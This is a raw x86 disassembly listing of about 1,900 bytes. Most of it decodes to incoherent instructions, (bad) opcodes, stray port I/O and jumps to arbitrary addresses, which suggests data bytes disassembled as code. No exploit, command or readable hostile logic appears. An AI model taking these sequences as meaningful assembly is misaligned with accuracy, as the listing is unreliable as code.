  40fc96:	sub    ah,BYTE PTR [ebx]
  40fc98:	xchg   ebx,eax
  40fc99:	(bad)  
  40fc9a:	(bad)  
  40fc9b:	mov    esi,0x19ccb289
  40fca0:	add    ebp,ecx
  40fca2:	ja     0x40fcd8
  40fca4:	popf   
  40fca5:	out    0x22,eax
  40fca7:	pop    es
  40fca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fca9:	mov    ah,0xd0
  40fcab:	fisub  WORD PTR [ebp+edi*2-0x7b850915]
  40fcb2:	push   ecx
  40fcb3:	inc    esp
  40fcb4:	mov    al,ds:0x1a27b453
  40fcb9:	sbb    esp,esp
  40fcbb:	in     eax,dx
  40fcbc:	inc    edi
  40fcbd:	out    dx,al
  40fcbe:	clc    
  40fcbf:	sub    BYTE PTR [edx-0x5af0a2cb],dh
  40fcc5:	call   0xf3c6:0x15798059
  40fccc:	cmp    al,0x56
  40fcce:	push   edi
  40fccf:	push   edi
  40fcd0:	pop    edi
  40fcd1:	aad    0x28
  40fcd3:	inc    eax
  40fcd4:	fadd   DWORD PTR ds:0xc0820803
  40fcda:	jmp    0xcd4c91ff
  40fcdf:	pop    eax
  40fce0:	std    
  40fce1:	rcl    DWORD PTR [esi+0x3c210132],cl
  40fce7:	ret    0xc870
  40fcea:	jo     0x40fcc4
  40fcec:	(bad)  
  40fced:	aam    0x11
  40fcef:	adc    BYTE PTR [ebp+eax*1-0x80],0x51
  40fcf4:	std    
  40fcf5:	outs   dx,DWORD PTR ds:[esi]
  40fcf7:	shr    DWORD PTR [edi],1
  40fcf9:	pop    edx
  40fcfa:	lock fcomp QWORD PTR ss:[edi+ebx*2]
  40fcff:	lods   eax,DWORD PTR ds:[esi]
  40fd00:	push   esi
  40fd01:	cdq    
  40fd02:	fwait
  40fd03:	fwait
  40fd04:	mov    bl,0xb1
  40fd06:	imul   esi
  40fd08:	mov    cl,0x9d
  40fd0a:	dec    esi
  40fd0b:	xchg   ebx,ecx
  40fd0d:	xchg   edi,eax
  40fd0e:	das    
  40fd0f:	mov    bl,0xbd
  40fd11:	mov    ebp,0x3d92948d
  40fd16:	jnp    0x40fd0e
  40fd18:	fsubr  DWORD PTR [eax+0x3132373d]
  40fd1e:	or     al,0x43
  40fd20:	pop    esi
  40fd21:	jp     0x40fd0c
  40fd23:	and    eax,0x493c9e4e
  40fd28:	mov    bh,0xdb
  40fd2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd2b:	xlat   BYTE PTR ds:[ebx]
  40fd2c:	jmp    0x40fd53
  40fd2e:	push   edi
  40fd2f:	scas   al,BYTE PTR es:[edi]
  40fd30:	pop    esp
  40fd31:	jns    0x40fd21
  40fd33:	lds    edx,FWORD PTR [edi]
  40fd35:	pop    edi
  40fd36:	cld    
  40fd37:	loop   0x40fcd2
  40fd39:	xor    esp,DWORD PTR [edi-0x72]
  40fd3c:	(bad)  
  40fd3d:	jno    0x40fd5b
  40fd3f:	add    dh,dl
  40fd41:	les    ecx,FWORD PTR [ecx+0x42115f13]
  40fd47:	push   esp
  40fd48:	xchg   edi,eax
  40fd49:	xchg   esi,eax
  40fd4a:	xchg   esi,eax
  40fd4b:	push   cs
  40fd4c:	sbb    al,0x3c
  40fd4e:	js     0x40fd40
  40fd50:	jne    0x40fdc1
  40fd52:	jp     0x40fd27
  40fd54:	fwait
  40fd55:	mov    esi,0x43a1d0e5
  40fd5a:	push   ebx
  40fd5b:	mov    ch,0x5a
  40fd5d:	lea    esi,[ecx-0x6ad5ce4f]
  40fd63:	or     bh,BYTE PTR [ebp-0x3ca330a2]
  40fd69:	cs das 
  40fd6b:	sub    eax,0xc8fa1d2d
  40fd70:	inc    edi
  40fd71:	repnz xlat BYTE PTR ds:[ebx]
  40fd74:	jg     0x40fd58
  40fd76:	daa    
  40fd77:	jle    0x40fd5b
  40fd79:	xchg   ebx,esp
  40fd7b:	cmp    BYTE PTR [esi],dh
  40fd7d:	mov    eax,ds:0xa6faba65
  40fd82:	inc    ebp
  40fd83:	add    DWORD PTR [esi+0x67],ebp
  40fd86:	in     al,0x19
  40fd88:	sub    bh,0x2c
  40fd8b:	fwait
  40fd8c:	repnz ds out dx,al
  40fd8f:	(bad)  
  40fd90:	sbb    BYTE PTR [eax],bl
  40fd92:	jp     0x40fd32
  40fd94:	push   edi
  40fd95:	fwait
  40fd96:	popf   
  40fd97:	popf   
  40fd98:	popf   
  40fd99:	jle    0x40fd7e
  40fd9b:	sbb    ebx,edi
  40fd9d:	clc    
  40fd9e:	sar    BYTE PTR [ebx],1
  40fda0:	fdivrp st(1),st
  40fda2:	mov    ?,WORD PTR [edi+0x1d]
  40fda5:	ds jl  0x40fda0
  40fda8:	fwait
  40fda9:	dec    esp
  40fdaa:	xor    eax,0x53a74e9a
  40fdaf:	fsubr  DWORD PTR [edi+0x777c23d7]
  40fdb5:	(bad)  
  40fdb7:	sti    
  40fdb8:	ret    0x2c2
  40fdbb:	in     eax,0x72
  40fdbd:	pop    ecx
  40fdbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdbf:	pop    ss
  40fdc0:	and    ecx,DWORD PTR ds:0x437fc9d0
  40fdc6:	mov    bl,0xec
  40fdc8:	dec    edx
  40fdc9:	retf   0x8a28
  40fdcc:	mov    eax,0xcb3cfe70
  40fdd1:	addr16 into 
  40fdd3:	and    BYTE PTR [eax+eiz*4+0x35332e5c],al
  40fdda:	xor    eax,0x8668cc5
  40fddf:	pop    es
  40fde0:	nop    DWORD PTR [esp+edi*2+0x62]
  40fde5:	or     BYTE PTR [ecx],0x87
  40fde8:	xchg   ecx,eax
  40fde9:	ja     0xaf1eb832
  40fdef:	popf   
  40fdf0:	xor    bl,BYTE PTR ds:0x91c21146
  40fdf6:	in     al,0x9
  40fdf8:	push   cs
  40fdf9:	sub    dh,al
  40fdfb:	int3   
  40fdfc:	sub    al,0x40
  40fdfe:	lods   al,BYTE PTR ds:[esi]
  40fdff:	fisub  DWORD PTR [eax]
  40fe01:	dec    eax
  40fe02:	ins    DWORD PTR es:[edi],dx
  40fe03:	add    al,0xa6
  40fe05:	lock imul esp,DWORD PTR [edi+0x28f34edd],0xffffffc6
  40fe0d:	mov    cl,0x99
  40fe0f:	mov    ds:0x36946851,eax
  40fe14:	out    dx,eax
  40fe15:	jne    0x40fe44
  40fe17:	xor    DWORD PTR [ebx-0x2f],0x3e
  40fe1b:	repz jmp 0x40fe50
  40fe1e:	add    bh,dh
  40fe20:	mov    bh,0x54
  40fe22:	sub    bh,BYTE PTR [ebp+0x4d40c96a]
  40fe28:	mov    ebx,0xf1700661
  40fe2d:	loop   0x40fdf4
  40fe2f:	sub    ecx,DWORD PTR [ebx+0x4a7a8b8b]
  40fe35:	stos   DWORD PTR es:[edi],eax
  40fe36:	push   edx
  40fe37:	add    DWORD PTR [edi+eiz*1+0x1c54bcc0],ecx
  40fe3e:	dec    ebx
  40fe3f:	sbb    eax,0xba3aa418
  40fe44:	shr    DWORD PTR [ecx-0x27],cl
  40fe47:	fdiv   DWORD PTR [ebx-0x6d]
  40fe4a:	sbb    BYTE PTR [ebx],ah
  40fe4c:	outs   dx,DWORD PTR ds:[esi]
  40fe4d:	add    al,0x74
  40fe4f:	fcomi  st,st(5)
  40fe51:	fadd   QWORD PTR [eax+0x691ab066]
  40fe57:	pop    ebx
  40fe58:	stos   DWORD PTR es:[edi],eax
  40fe59:	aad    0x32
  40fe5b:	push   eax
  40fe5c:	fisttp WORD PTR [eax-0x70]
  40fe5f:	sub    eax,0xbd7a503d
  40fe64:	push   ds
  40fe65:	cmc    
  40fe66:	jp     0x40fe05
  40fe68:	add    eax,DWORD PTR [edi]
  40fe6a:	push   cs
  40fe6b:	shr    BYTE PTR [esi+esi*1+0x2d],1
  40fe6f:	xchg   ebx,eax
  40fe70:	xor    cl,bh
  40fe72:	fst    DWORD PTR [edi+0x59599797]
  40fe78:	pop    ecx
  40fe79:	popa   
  40fe7a:	ins    DWORD PTR es:[edi],dx
  40fe7b:	ins    DWORD PTR es:[edi],dx
  40fe7c:	lea    ecx,[ebp-0x4949f273]
  40fe82:	mov    dh,0xce
  40fe84:	lahf   
  40fe85:	ds jge 0x40fe82
  40fe88:	mov    DWORD PTR [ebx-0x69],ecx
  40fe8b:	cs popf 
  40fe8d:	pop    eax
  40fe8e:	pop    ecx
  40fe8f:	pop    ecx
  40fe90:	jns    0x40feb7
  40fe92:	dec    ecx
  40fe93:	xchg   edx,eax
  40fe94:	or     BYTE PTR ds:0x82284bdb,al
  40fe9a:	in     eax,dx
  40fe9b:	out    dx,eax
  40fe9c:	fistp  QWORD PTR [edi-0x10421e81]
  40fea2:	jge    0x40fe93
  40fea4:	fwait
  40fea5:	out    dx,al
  40fea6:	mov    ecx,0x87839ee7
  40feab:	nop    DWORD PTR [esi-0x46]
  40feaf:	xor    edi,esi
  40feb1:	ss ss ss adc al,0x8c
  40feb6:	aad    0x70
  40feb8:	push   esi
  40feb9:	inc    edi
  40feba:	add    dh,BYTE PTR [esi-0x61]
  40febd:	jns    0x40fea5
  40febf:	cdq    
  40fec0:	inc    edi
  40fec1:	sahf   
  40fec2:	jge    0x40feba
  40fec4:	fnstcw WORD PTR [edi]
  40fec6:	aad    0x83
  40fec8:	ret    0xfe48
  40fecb:	or     BYTE PTR [ebp-0x78],ch
  40fece:	arpl   WORD PTR [ebp+ebx*1+0x70],dx
  40fed2:	mov    ebx,ebx
  40fed4:	xor    BYTE PTR [eax],al
  40fed6:	ja     0x40feb1
  40fed8:	inc    ebp
  40fed9:	add    al,0x83
  40fedb:	stc    
  40fedc:	stc    
  40fedd:	stc    
  40fede:	stc    
  40fedf:	xchg   DWORD PTR [edi],ebx
  40fee1:	jle    0x40fedb
  40fee3:	fistp  DWORD PTR [edi]
  40fee5:	js     0x40fec7
  40fee7:	xor    DWORD PTR [edi-0xf87c3e4],0xc9c9c9ae
  40fef1:	icebp  
  40fef2:	cmp    al,0xd1
  40fef4:	out    0x9,eax
  40fef6:	jge    0x40ff1f
  40fef8:	push   ax
  40fefa:	mov    ah,0x2d
  40fefc:	outs   dx,DWORD PTR ds:[esi]
  40fefd:	adc    DWORD PTR [bp+si-0x28],eax
  40ff01:	push   0x231d0dc9
  40ff06:	push   eax
  40ff07:	mov    ebp,DWORD PTR fs:[ecx]
  40ff0a:	(bad)  
  40ff0b:	fiadd  WORD PTR [esi]
  40ff0d:	cmp    bl,BYTE PTR [ebx+0x1c71b90c]
  40ff13:	jae    0x40ff0e
  40ff15:	repnz gs into 
  40ff18:	popf   
  40ff19:	push   ebx
  40ff1a:	dec    ecx
  40ff1b:	jno    0x40fee7
  40ff1d:	in     eax,0x32
  40ff1f:	aad    0x6a
  40ff21:	aad    0xda
  40ff23:	jo     0x40feb1
  40ff25:	retf   
  40ff26:	jbe    0x40ff96
  40ff28:	jle    0x40ff08
  40ff2a:	xor    bl,BYTE PTR [esi]
  40ff2c:	push   ebx
  40ff2d:	fisubr WORD PTR [ebp+0xd13efd7]
  40ff33:	xchg   DWORD PTR [edx+eax*8],ecx
  40ff36:	nop
  40ff37:	scas   al,BYTE PTR es:[edi]
  40ff38:	mov    dh,0x2b
  40ff3a:	and    al,0x52
  40ff3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff3d:	dec    edi
  40ff3e:	aaa    
  40ff3f:	cmc    
  40ff40:	pop    ss
  40ff41:	xor    al,0xc
  40ff43:	add    eax,0x63fd1cd2
  40ff48:	arpl   WORD PTR [ebx+0x24],sp
  40ff4b:	push   es
  40ff4c:	ins    DWORD PTR es:[edi],dx
  40ff4d:	mov    ah,0xdb
  40ff4f:	ss pop ebp
  40ff51:	ja     0x40fef8
  40ff53:	push   edx
  40ff54:	sbb    DWORD PTR [ecx-0x62],eax
  40ff57:	outs   dx,BYTE PTR ds:[esi]
  40ff58:	pop    edi
  40ff59:	fmul   QWORD PTR [ebx+edx*1]
  40ff5c:	jo     0x40ff89
  40ff5e:	pop    edx
  40ff5f:	cdq    
  40ff60:	imul   edx,DWORD PTR [ebx+ecx*8-0x3162c59b],0xffffffd5
  40ff68:	out    0x9e,eax
  40ff6a:	jnp    0x40ff5a
  40ff6c:	or     DWORD PTR [edx-0x212423ba],esi
  40ff72:	jbe    0x40ff37
  40ff74:	add    BYTE PTR [esi],al
  40ff76:	pop    es
  40ff77:	push   cs
  40ff78:	sbb    al,0x60
  40ff7a:	xor    BYTE PTR [eax],bl
  40ff7c:	call   0x494a4755
  40ff81:	adc    ah,BYTE PTR [ebp+0x6c]
  40ff84:	add    dh,al
  40ff86:	xor    esp,DWORD PTR [eax-0x58218d4]
  40ff8c:	std    
  40ff8d:	push   ds
  40ff8e:	(bad)  
  40ff8f:	push   ds
  40ff90:	and    BYTE PTR [eax+eiz*2+0x175e1c38],al
  40ff97:	(bad)  
  40ff98:	out    dx,eax
  40ff99:	fs in  al,0x4b
  40ff9c:	xchg   edx,eax
  40ff9d:	test   BYTE PTR [edx-0x47],dh
  40ffa0:	int3   
  40ffa1:	clc    
  40ffa2:	clc    
  40ffa3:	cmp    bl,dl
  40ffa5:	rcl    ebx,cl
  40ffa7:	jbe    0x40ff33
  40ffa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffaa:	cmp    DWORD PTR [esi+0x38],esi
  40ffad:	sbb    al,0xb2
  40ffaf:	mov    ch,0xb5
  40ffb1:	gs inc ebx
  40ffb3:	jo     0x40ff42
  40ffb5:	xchg   ebp,eax
  40ffb6:	jp     0x410026
  40ffb8:	outs   dx,BYTE PTR ds:[esi]
  40ffb9:	into   
  40ffba:	push   es
  40ffbb:	lods   al,BYTE PTR ds:[esi]
  40ffbc:	cwde   
  40ffbd:	jmp    0x5d6f978a
  40ffc2:	loop   0x40ff59
  40ffc4:	push   edi
  40ffc5:	pop    esi
  40ffc6:	popa   
  40ffc7:	jns    0x410042
  40ffc9:	fldenv [ecx*8+0x71389eec]
  40ffd0:	loop   0x40ff61
  40ffd2:	mov    ds,WORD PTR [edi]
  40ffd4:	aas    
  40ffd5:	(bad)  
  40ffd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffd7:	pop    esi
  40ffd8:	scas   eax,DWORD PTR es:[edi]
  40ffd9:	xlat   BYTE PTR ds:[ebx]
  40ffda:	sar    ch,cl
  40ffdc:	push   edx
  40ffdd:	sar    BYTE PTR [edi+0x9],cl
  40ffe0:	xor    BYTE PTR [edi+ebx*4-0x30866061],bl
  40ffe7:	jnp    0x40ffc7
  40ffe9:	repz lock mov ebx,0xb7eefddf
  40fff0:	out    dx,eax
  40fff1:	(bad)  [edi+0x2082c6f]
  40fff7:	retf   0x10ba
  40fffa:	call   0x63a1305f
  40ffff:	arpl   WORD PTR [ebx-0x66944892],ax
  410005:	dec    edi
  410006:	adc    al,0x45
  410008:	cmp    al,0xf1
  41000a:	les    edx,FWORD PTR [ebx]
  41000c:	pop    edi
  41000d:	clc    
  41000e:	cld    
  41000f:	out    0x3f,eax
  410011:	(bad)  
  410012:	jmp    0x40fffb
  410014:	into   
  410015:	popf   
  410016:	cmp    eax,DWORD PTR [ebp+0x451f7a22]
  41001c:	clc    
  41001d:	adc    DWORD PTR [edx-0xa],ebp
  410020:	mov    DWORD PTR [ecx+0x1],eax
  410023:	adc    DWORD PTR [ebx],edi
  410025:	xor    eax,DWORD PTR [eax-0xa640ec4]
  41002b:	inc    ecx
  41002c:	mov    bl,0xd9
  41002e:	ins    BYTE PTR es:[edi],dx
  41002f:	jle    0x410019
  410031:	inc    ebx
  410032:	pop    ds
  410033:	cli    
  410034:	sahf   
  410035:	ja     0x40fff5
  410037:	repz popf 
  410039:	pop    ds
  41003a:	call   0x69d4:0x37d99999
  410041:	leave  
  410042:	(bad)  
  410044:	jbe    0x40ffcc
  410046:	or     bl,dh
  410048:	add    al,0x79
  41004a:	mov    ds:0x3e5a6fc4,eax
  41004f:	xchg   ebp,eax
  410050:	mov    ch,0xab
  410052:	jbe    0x41006d
  410054:	jne    0x410016
  410056:	sub    eax,0x65ee6178
  41005b:	pop    esp
  41005c:	ret    0x22e
  41005f:	xor    bh,bl
  410061:	sub    al,0x9f
  410063:	hlt    
  410064:	aad    0xcc
  410066:	pushf  
  410067:	mov    ebx,fs
  410069:	fmul   st,st(6)
  41006b:	scas   al,BYTE PTR es:[edi]
  41006c:	je     0x40fff3
  41006e:	inc    ebp
  41006f:	test   eax,0x62626254
  410074:	cmp    cl,0xf9
  410077:	jns    0x4100df
  410079:	addr16 addr16 pop ecx
  41007c:	pop    esp
  41007d:	pop    esp
  41007e:	fistp  QWORD PTR fs:[esi+0x4c4c4c7d]
  410085:	push   eax
  410086:	sub    dl,BYTE PTR [ebp-0x1e0885ac]
  41008c:	shl    BYTE PTR [esi+0x5b],1
  41008f:	jmp    0xc37d:0xb50cbb74
  410096:	jp     0x4100b7
  410098:	hlt    
  410099:	jge    0x410062
  41009b:	mov    bh,0xed
  41009e:	jnp    0x410088
  4100a0:	test   al,0x4d
  4100a2:	xchg   ebp,eax
  4100a3:	fmulp  st(5),st
  4100a5:	mov    esi,ebp
  4100a7:	fmul   QWORD PTR [ecx-0x5e]
  4100aa:	out    dx,eax
  4100ab:	xchg   esi,eax
  4100ac:	or     esp,esp
  4100ae:	fucom  st(2)
  4100b0:	xchg   ebp,eax
  4100b1:	dec    edx
  4100b2:	test   DWORD PTR [edx-0x5b],ecx
  4100b5:	ret    0xf2f2
  4100b8:	bnd jg 0x410138
  4100bb:	jmp    0x906f9865
  4100c0:	inc    esi
  4100c1:	jno    0x41005d
  4100c3:	mov    edi,0x6e39629d
  4100c8:	dec    ecx
  4100c9:	mov    ebx,0xfbe00661
  4100ce:	mov    esi,0xce52d807
  4100d3:	jno    0x410141
  4100d5:	ret    0xb381
  4100d8:	sub    al,BYTE PTR [eax-0x16dff656]
  4100de:	jbe    0x4100bb
  4100e0:	cmp    dh,BYTE PTR [edi+0x59d2345c]
  4100e6:	inc    ebp
  4100e7:	adc    bl,dl
  4100e9:	inc    ebp
  4100ea:	add    al,0xf9
  4100ec:	add    DWORD PTR [ebx],ebx
  4100ee:	add    al,0x81
  4100f0:	popf   
  4100f1:	xchg   edi,ebp
  4100f3:	(bad)  
  4100f4:	adc    ebx,DWORD PTR [eax]
  4100f6:	and    edx,esi
  4100f8:	cli    
  4100f9:	cli    
  4100fa:	cmp    bl,BYTE PTR [ebx]
  4100fc:	sbb    ebx,DWORD PTR [ebx]
  4100fe:	or     al,0x6
  410100:	add    eax,esi
  410102:	mov    dh,0xd8
  410105:	mov    bh,0x6f
  410107:	pop    ds
  410108:	push   ebx
  410109:	push   ebx
  41010a:	push   ebx
  41010b:	xchg   esi,eax
  41010c:	mov    ds:0xfe76c19b,eax
  410111:	cld    
  410112:	jns    0x410172
  410114:	jns    0x4100fb
  410116:	adc    eax,0x8c565656
  41011b:	jno    0x4100cc
  41011d:	jnp    0x41010d
  41011f:	fdivr  QWORD PTR [ecx-0xd034251]
  410125:	retf   
  410126:	pop    edi
  410127:	pop    esp
  410128:	pop    ebp
  410129:	pop    ebp
  41012a:	mov    ebp,0x26f82280
  41012f:	jmp    0xf95d:0x58284423
  410136:	rol    BYTE PTR [edi],0x3e
  410139:	lock mov esi,0xfdffbff7
  41013f:	out    dx,eax
  410140:	pop    ecx
  410141:	pop    eax
  410142:	pop    eax
  410143:	cwde   
  410144:	sub    BYTE PTR [edi+0x356ad4cb],dl
  41014a:	fwait
  41014b:	xchg   edi,eax
  41014c:	jg     0x4101c9
  41014e:	jnp    0x41012b
  410150:	mov    ds:0x6deded8d,al
  410155:	pop    edx
  410156:	lods   eax,DWORD PTR ds:[esi]
  410157:	push   ss
  410158:	pop    ss
  410159:	cs pop esp
  41015b:	js     0x410146
  41015d:	sub    ebx,DWORD PTR [edi-0x7]
  410160:	retf   0x3c1f
  410163:	cli    
  410164:	call   0xa4e1910c
  410169:	jl     0x4101b0
  41016b:	call   FWORD PTR [edx]
  41016d:	mov    ds:0x2dbfb5d7,al
  410172:	xor    esi,DWORD PTR [eax]
  410174:	test   al,0xc0
  410176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410177:	xor    al,0x83
  410179:	pop    esi
  41017a:	pop    ebp
  41017b:	mov    ds:0xc435f4f7,al
  410180:	inc    ebx
  410181:	(bad)  
  410183:	hlt    
  410184:	loopne 0x41010d
  410186:	aas    
  410187:	cld    
  410188:	loope  0x410149
  41018a:	jno    0x41017b
  41018c:	mov    ebp,0xd7b9bef7
  410191:	jmp    0x41016c
  410193:	fs stos DWORD PTR es:[edi],eax
  410195:	outs   dx,BYTE PTR ds:[esi]
  410196:	mov    edi,0xaeaf13b9
  41019b:	add    eax,0x4c7aff3
  4101a0:	repnz (bad) 
  4101a3:	mov    ebp,0x4cfbefa6
  4101a8:	dec    ebp
  4101a9:	dec    ebp
  4101aa:	mov    cl,0xbd
  4101ac:	mov    ebp,0x79a58d6d
  4101b1:	call   0xe1a0a25
  4101b6:	add    al,0x73
  4101b8:	jg     0x4101e7
  4101ba:	jl     0x410233
  4101bc:	lods   al,BYTE PTR ds:[esi]
  4101bd:	in     eax,dx
  4101be:	stc    
  4101bf:	pop    esp
  4101c0:	or     edx,DWORD PTR [edx+0x4a]
  4101c3:	ss ss ss pop eax
  4101c7:	pop    ebp
  4101c8:	pop    ebp
  4101c9:	inc    ebp
  4101ca:	dec    edx
  4101cb:	xchg   ebp,eax
  4101cc:	outs   dx,BYTE PTR ds:[esi]
  4101cd:	int    0x44
  4101cf:	jb     0x4101bf
  4101d1:	fnstsw WORD PTR [ebx-0x8040269]
  4101d7:	mov    bl,0xb0
  4101d9:	mov    al,0x40
  4101db:	mov    ds:0x6a6a60d1,eax
  4101e0:	or     ch,BYTE PTR [ecx]
  4101e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e3:	dec    ebp
  4101e4:	mov    edi,0xd7e9d1d6
  4101e9:	push   es
  4101ea:	cmp    al,BYTE PTR [edi+0x60f79982]
  4101f0:	out    dx,al
  4101f1:	scas   al,BYTE PTR es:[di]
  4101f3:	in     eax,0x32
  4101f5:	sbb    al,0x77
  4101f7:	mov    ebp,fs
  4101f9:	sti    
  4101fa:	popa   
  4101fb:	aaa    
  4101fc:	dec    esp
  4101fd:	sar    BYTE PTR [eax-0x72],0xc
  410201:	jb     0x4101b0
  410203:	xlat   BYTE PTR ds:[ebx]
  410204:	jmp    0x41020a
  410206:	inc    ecx
  410207:	rcr    BYTE PTR [edi-0x3603604],0x91
  41020e:	jle    0x4101cf
  410210:	sub    BYTE PTR [ecx+eiz*2-0x191dca28],0x3b
  410218:	(bad)  
  410219:	sbb    ecx,esi
  41021b:	or     al,0x76
  41021d:	arpl   WORD PTR [esp+ebx*2],ax
  410220:	aaa    
  410221:	das    
  410222:	ds sbb ah,dh
  410225:	xchg   ecx,eax
  410226:	xor    cl,ch
  410228:	or     BYTE PTR [ebx],0xa9
  41022b:	sbb    edx,DWORD PTR [eax-0x3f]
  41022e:	lock push cs
  410230:	add    DWORD PTR [ecx+0xf],0x69
  410234:	jmp    0x410210
  410236:	stos   DWORD PTR es:[edi],eax
  410237:	data16 adc ch,BYTE PTR [edx-0x66]
  41023b:	jecxz  0x410219
  41023d:	mov    cs,esp
  41023f:	ja     0x4101e1
  410241:	out    dx,eax
  410242:	sti    
  410243:	aam    0x6a
  410245:	xor    eax,0xb6cca6aa
  41024a:	jbe    0x410231
  41024c:	cdq    
  41024d:	(bad)  
  41024e:	aam    0xed
  410250:	jbe    0x41023b
  410252:	idiv   ebx
  410254:	ins    BYTE PTR es:[edi],dx
  410255:	outs   dx,BYTE PTR ds:[esi]
  410256:	outs   dx,BYTE PTR ds:[esi]
  410257:	adc    al,BYTE PTR [ebp+0x11]
  41025a:	cmc    
  41025b:	jp     0x4101fa
  41025d:	cdq    
  41025e:	cdq    
  41025f:	sbb    ebx,ebp
  410261:	retf   0xad33
  410264:	(bad)  [esi-0x4d]
  410267:	mov    cl,0xb1
  410269:	shl    ebp,0xcb
  41026c:	xchg   edi,eax
  41026d:	cmp    DWORD PTR [ebx-0x1a],esi
  410270:	or     al,0xdd
  410272:	outs   dx,BYTE PTR ds:[esi]
  410273:	push   edi
  410274:	outs   dx,BYTE PTR ds:[esi]
  410275:	outs   dx,DWORD PTR ds:[esi]
  410276:	outs   dx,DWORD PTR ds:[esi]
  410277:	pop    edi
  410278:	mov    esi,0xcbf2f97c
  41027d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41027e:	dec    esi
  41027f:	popf   
  410280:	cli    
  410281:	rcr    dl,cl
  410283:	fcmovu st,st(2)
  410285:	and    eax,0x5f196114
  41028a:	popa   
  41028b:	add    al,0x24
  41028d:	pop    es
  41028e:	nop    esp
  410291:	jg     0x410277
  410293:	enter  0x8391,0x6f
  410297:	jge    0x410284
  410299:	pop    ebx
  41029a:	pop    edi
  41029b:	jmp    eax
  41029d:	or     DWORD PTR [edi],0xffffffde
  4102a0:	imul   esp,DWORD PTR [eax-0x42],0x21
  4102a4:	jl     0x4102a9
  4102a6:	cmc    
  4102a7:	aaa    
  4102a8:	aaa    
  4102a9:	aaa    
  4102aa:	jmp    0xafed7da4
  4102af:	scas   eax,DWORD PTR es:[edi]
  4102b0:	inc    edi
  4102b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b2:	dec    edi
  4102b3:	lahf   
  4102b4:	jle    0x41029f
  4102b6:	mov    ecx,0xe47b9ee7
  4102bb:	icebp  
  4102bc:	(bad)  
  4102bd:	pop    ds
  4102be:	call   DWORD PTR [edx+0x18]
  4102c1:	xchg   BYTE PTR [ebp-0x23],ch
  4102c4:	mov    edi,0x94436886
  4102c9:	push   ebp
  4102ca:	ds jb  0x410263
  4102cd:	inc    ebx
  4102ce:	push   edx
  4102cf:	add    al,0x90
  4102d1:	aaa    
  4102d2:	or     dh,ah
  4102d4:	push   ebp
  4102d5:	sbb    BYTE PTR [eax+0x6fbdbfff],0x8f
  4102dc:	xchg   ecx,eax
  4102dd:	mov    ds:0x55fcf73a,eax
  4102e2:	cmc    
  4102e3:	mov    ebx,0xe5e7bba7
  4102e8:	sbb    DWORD PTR [ebx+0x6c],edi
  4102eb:	cmp    al,0xbe
  4102ed:	mov    dh,0x31
  4102ef:	ss fsub st,st(6)
  4102f2:	jno    0x41028b
  4102f4:	cwde   
  4102f5:	inc    eax
  4102f6:	add    al,BYTE PTR [ecx-0x4b767ca0]
  4102fc:	and    DWORD PTR [ecx+0x50],edx
  4102ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410300:	(bad)  
  410302:	pop    ds
  410303:	push   edi
  410304:	mov    ecx,0xae89bdd2
  410309:	push   esi
  41030a:	dec    edx
  41030b:	push   esi
  41030c:	and    BYTE PTR [ecx],dl
  41030e:	push   esi
  41030f:	pop    ecx
  410310:	loopne 0x4102d8
  410312:	and    BYTE PTR [ecx-0x5bb269d5],ah
  410318:	fwait
  410319:	aad    0xe6
  41031b:	inc    esi
  41031c:	mov    al,BYTE PTR [edx-0x30]
  41031f:	pop    ebp
  410320:	imul   edx,DWORD PTR ds:0x4c20d864,0x836c4dae
  41032a:	jns    0x4102f0
  41032c:	das    
  41032d:	int3   
  41032e:	loopne 0x410308
  410330:	jecxz  0x41034b
  410332:	jnp    0x410392
  410334:	fnstsw WORD PTR ds:0xeee9eeaf
  41033a:	jno    0x4103b3
  41033c:	cmc    
  41033d:	mov    ds:0xff7aabba,eax
  410342:	call   0x3f00ae45
  410347:	jae    0x4102f3
  410349:	jnp    0x410311
  41034b:	fadd   DWORD PTR [eax+edx*4-0x515ab606]
  410352:	(bad)  
  410353:	test   eax,0xf5d553aa
  410358:	std    
  410359:	mov    esi,0x39cef9c7
  41035e:	xor    BYTE PTR [ecx+0x7baed76b],0xee
  410365:	mov    ebp,0x7c6fdef7
  41036a:	icebp  
  41036b:	mov    ebx,DWORD PTR [edi-0x4]
  41036e:	add    BYTE PTR es:[edi-0x6dba0fb4],ch
  410375:	xchg   ebp,eax
  410376:	mov    ecx,0x9b0fb255
  41037b:	scas   eax,DWORD PTR es:[edi]
  41037c:	mov    bh,0x72
  41037e:	add    eax,edi
  410380:	xor    eax,0x870ffcc8
  410385:	ret    
  410386:	(bad)  
  410387:	jbe    0x41033e
  410389:	pop    edx
  41038a:	mov    ch,0xbe
  41038c:	or     eax,0x8517711e
  410391:	sahf   
  410392:	scas   al,BYTE PTR es:[edi]
  410393:	inc    ecx
  410394:	mov    edi,DWORD PTR [eax+0x4c]
  410397:	lods   al,BYTE PTR ds:[esi]
  410398:	das    
  410399:	lea    esp,[esi-0x1a370ab4]
  41039f:	jb     0x4103f9
  4103a1:	pop    esp
  4103a2:	pop    esp
  4103a3:	les    esp,FWORD PTR [ebp-0x76ef68b5]
  4103a9:	inc    esp
  4103aa:	adc    BYTE PTR [esi+eax*1],cl
  4103ad:	rcl    ebp,1
  4103af:	aad    0x85
  4103b1:	aad    0xab
  4103b3:	push   edi
  4103b4:	mov    ds:0x12c7a7a7,eax
  4103b9:	mov    eax,0xce822448
  4103be:	into   
  4103bf:	dec    esi
  4103c0:	mov    edx,DWORD PTR [eax+ecx*8+0x3d]
  4103c4:	mov    ds:0xc5312584,eax
  4103c9:	cdq    
  4103ca:	xlat   BYTE PTR ds:[ebx]
  4103cb:	jmp    0xabc19463
  4103d0:	or     DWORD PTR ds:[ebx],0xc130e0d
  4103d7:	push   es
  4103d8:	mov    eax,ds:0xc7c60a28
  4103dd:	mov    DWORD PTR [edi-0x42108422],0x78da883
  4103e7:	inc    ecx
  4103e8:	inc    ecx
  4103e9:	popa   
